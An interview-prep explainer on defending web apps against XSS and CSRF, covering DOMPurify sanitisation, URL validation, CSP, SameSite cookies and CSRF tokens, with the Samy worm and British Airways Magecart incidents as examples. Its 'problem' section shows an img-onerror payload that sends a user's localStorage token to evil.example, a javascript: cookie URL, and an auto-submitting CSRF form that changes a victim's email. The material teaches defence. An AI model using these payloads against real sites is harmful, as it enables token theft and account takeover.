# How do you protect applications against XSS and CSRF?

**Level:** Mid
**Merged from (original phrasings):**
- How do you protect applications against XSS and CSRF?

## The concept (short answer)
- **XSS (Cross-Site Scripting):** an attacker gets **their JavaScript to run in your origin**, for example through user content rendered as HTML, a `javascript:` URL, or a compromised third-party script. That script can do anything the user can: read the DOM and non-httpOnly tokens, call your APIs, skim forms.
  - React escapes text in `{}` by default. The holes are `dangerouslySetInnerHTML`, `href={userUrl}` (`javascript:` URLs), direct DOM APIs (`innerHTML`, `insertAdjacentHTML`), `eval`/`new Function`, and SSR that injects unescaped JSON into `<script>`.
  - Defenses: don't render raw HTML. If you must, **sanitize with DOMPurify**. Validate URL schemes (`https:` only). Add a strict **Content Security Policy** (nonces, no `unsafe-inline`) as a second layer. Use **Subresource Integrity** on third-party scripts. Keep session cookies **httpOnly**.
- **CSRF (Cross-Site Request Forgery):** a malicious site makes the user's **browser** send a request to your site, and the browser **automatically attaches cookies**, so the request is authenticated. The attacker can't read the response but can trigger state changes (transfer money, change email).
  - Defenses: **SameSite=Lax/Strict** cookies (cookies not sent on cross-site POSTs), **CSRF tokens** (synchronizer or double-submit) for unsafe methods, checking `Origin`/`Sec-Fetch-Site`, never changing state on GET, and strict CORS (no reflecting `*` origins with credentials).
- Important: **XSS defeats CSRF protection** (script in your own origin can read the CSRF token), so XSS prevention comes first.
- **Real incidents:** in 2005 the **Samy worm** used a stored XSS on MySpace profiles to add the attacker as a friend and copy itself to every profile viewer, reaching over a million profiles in about a day. In 2018 the **British Airways Magecart attack** changed a third-party JavaScript library (Modernizr) served from BA's own site so that it sent card details typed on the payment page to a lookalike attacker domain. Hundreds of thousands of customers were affected and the UK ICO fined BA £20M. A strict CSP `connect-src` (blocks sending data to unknown hosts), SRI hashes on scripts, and monitoring for script changes are the defenses aimed at exactly that.

## Real-life example: the problem
In a recipe-sharing community app, users write recipe descriptions in a rich-text editor and the HTML is saved as-is. A user posts a recipe whose description contains `<img src=x onerror="fetch('https://evil.example/c?t='+localStorage.token)">`. Every visitor who opens the recipe silently sends their auth token to the attacker. The same app also had a "change email" endpoint accepting cookie-authenticated POSTs with no CSRF protection, so attackers could also hide an auto-submitting form on any website.

```jsx
// Stored XSS: raw user HTML rendered
function RecipeDescription({ recipe }) {
  return <div dangerouslySetInnerHTML={{ __html: recipe.descriptionHtml }} />;
}

// Unvalidated URL: <a href="javascript:alert(document.cookie)">
function AuthorLink({ author }) {
  return <a href={author.website}>{author.name}'s website</a>;
}
```

```html
<!-- On evil.example: CSRF via auto-submitted form (session cookie has no SameSite) -->
<form action="https://recipes.example.com/api/account/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.example" />
</form>
<script>document.forms[0].submit()</script>
```

## How to fix it
**XSS: sanitize, validate URLs, restrict with CSP.**
```jsx
import DOMPurify from 'dompurify';

const ALLOWED = { ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'ul', 'ol', 'li', 'a', 'h3'],
                  ALLOWED_ATTR: ['href'] };

function RecipeDescription({ recipe }) {
  const clean = useMemo(() => DOMPurify.sanitize(recipe.descriptionHtml, ALLOWED), [recipe.descriptionHtml]);
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

function safeUrl(url) {
  try {
    const u = new URL(url);
    return u.protocol === 'https:' || u.protocol === 'http:' ? u.href : undefined;
  } catch { return undefined; }
}

function AuthorLink({ author }) {
  const href = safeUrl(author.website);
  return href ? <a href={href} rel="noopener noreferrer nofollow" target="_blank">{author.name}'s website</a> : null;
}
```
Sanitize on the server as well, when content is saved, so other clients (mobile, emails) are safe too.

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random-per-request}' 'strict-dynamic';
  connect-src 'self' https://api.recipes.example.com;
  img-src 'self' https://cdn.recipes.example.com data:;
  object-src 'none'; base-uri 'none'; frame-ancestors 'none'
```
Even if an injection slips through, inline handlers and scripts without the nonce won't run, and `connect-src` blocks sending stolen data to unknown domains.

**CSRF: SameSite cookies + token + Origin check.**
```js
res.cookie('sid', sessionId, { httpOnly: true, secure: true, sameSite: 'lax' });

app.use((req, res, next) => {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
  const origin = req.get('Origin');
  if (origin && origin !== 'https://recipes.example.com') return res.sendStatus(403);
  if (req.get('X-CSRF-Token') !== req.session.csrfToken) return res.sendStatus(403);
  next();
});
```
```js
// client: send the token (provided in a meta tag or a /csrf endpoint) with mutations
fetch('/api/account/email', {
  method: 'POST', credentials: 'same-origin',
  headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
  body: JSON.stringify({ email }),
});
```

Why it works: DOMPurify removes event handlers, `<script>` and dangerous URLs while keeping safe formatting. CSP is a second layer that blocks whatever still gets through. For CSRF, the browser won't attach a `SameSite=Lax` cookie to a cross-site POST, and even if it did, the attacker's page cannot read or guess the CSRF token or forge the `Origin` header.

Note: Next.js Server Actions already compare `Origin` with `Host` and accept only POST, but custom Route Handlers that use cookies need their own checks.

## How to say it in the interview
- "XSS is the attacker's code running in my origin, CSRF is the attacker's site using my user's cookies. Different attacks, different defenses."
- "React escapes by default, so I look at the escape hatches: `dangerouslySetInnerHTML`, user-controlled `href`s, direct DOM writes, and third-party scripts. I sanitize with DOMPurify and use a nonce-based CSP and SRI as a second layer."
- Trap: "We use JWT in localStorage, so CSRF doesn't apply." True, but now any XSS steals the token. With httpOnly cookies you trade that for CSRF, which SameSite and tokens handle well.
- Trade-off: a strict CSP can break inline scripts and some third-party tags. Roll it out with `Content-Security-Policy-Report-Only` first and fix violations before enforcing.
